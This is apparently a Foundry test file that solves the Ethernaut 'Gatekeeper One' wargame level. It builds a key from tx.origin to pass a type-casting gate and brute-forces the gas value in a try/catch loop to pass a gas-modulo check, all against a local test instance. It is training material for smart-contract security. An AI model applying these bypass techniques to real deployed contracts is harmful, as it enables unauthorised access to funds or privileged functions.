pragma solidity ^0.8.10;

import "ds-test/test.sol";
import "../src/levels/13_GatekeeperOne/GatekeeperOneFactory.sol";
import "../src/levels/13_GatekeeperOne/GatekeeperOneHack.sol";
import "../src/core/Ethernaut.sol";
import "./utils/vm.sol";
import "forge-std/console.sol";


contract GatekeeperOneTest is DSTest {
    Vm vm = Vm(address(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D));
    Ethernaut ethernaut;
    

    function setUp() public {
        // Setup instance of the Ethernaut contract
        ethernaut = new Ethernaut();
    }

    function testGatekeeperOneHack() public {
        /////////////////
        // LEVEL SETUP //
        /////////////////

        GatekeeperOneFactory gatekeeperOneFactory = new GatekeeperOneFactory();
        ethernaut.registerLevel(gatekeeperOneFactory);
        // Sets all subsequent calls' msg.sender to be the tx.origin address until `stopPrank` is called
        // TODO: WHY??
        vm.startPrank(tx.origin);
        console.log(tx.origin);
        address levelAddress = ethernaut.createLevelInstance(gatekeeperOneFactory);
        console.log(levelAddress);
        GatekeeperOne ethernautGatekeeperOne = GatekeeperOne(payable(levelAddress));
        vm.stopPrank();

        //////////////////
        // LEVEL ATTACK //
        //////////////////


        // Create GatekeeperOneHack contract
        GatekeeperOneHack gatekeeperOneHack = new GatekeeperOneHack(levelAddress);

        // Need an 8 byte key that matches the conditions for gate 3 - we start from the fixed value - uint16(uint160(tx.origin) - then work out what the key needs to be
        // 00 00 SECOND_LAST_BYTE_OF_ADDRESS LAST_BYTE_OF_ADDRESS
        bytes4 halfKey = bytes4(bytes.concat(bytes2(uint16(0)),bytes2(uint16(uint160(tx.origin)))));
        
        // 0x ANY_DATA ANY_DATA ANY_DATA ANY_DATA 00 00 SECOND_LAST_BYTE_OF_ADDRESS LAST_BYTE_OF_ADDRESS
        // key = "0x0000ea720000ea72"
        bytes8 key = bytes8(bytes.concat(halfKey, halfKey));

        // View emitted values and compare them to the requires in Gatekeeper One

        emit log_named_uint("Gate 3 all requires", uint32(uint64(key)));
        emit log_named_uint("Gate 3 first require", uint16(uint64(key)));
        emit log_named_uint("Gate 3 second require", uint64(key));
        emit log_named_uint("Gate 3 third require", uint16(uint160(tx.origin)));

        // Loop through a until correct gas is found, use try catch to get around the revert
        // We know that the gas used by the enter transaction must be at least 8191 plus all the gas spent to execute those opcodes. After some brute force testing, my guess will be 73990
        for (uint i = 0; i <= 8191; i++) {
            try ethernautGatekeeperOne.enter{gas: 73990+i}(key) {
                // You start with a base gas value just to be sure that the transaction will not revert because of an Out of Gas exception
                emit log_named_uint("Pass - Gas", 73990+i);
                break;
            } catch {
                emit log_named_uint("Fail - Gas", 73990+i);
            }
        }
 

        //////////////////////
        // LEVEL SUBMISSION //
        //////////////////////
        vm.startPrank(tx.origin);
        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(payable(levelAddress));
        vm.stopPrank();
        assert(levelSuccessfullyPassed);
    }
}
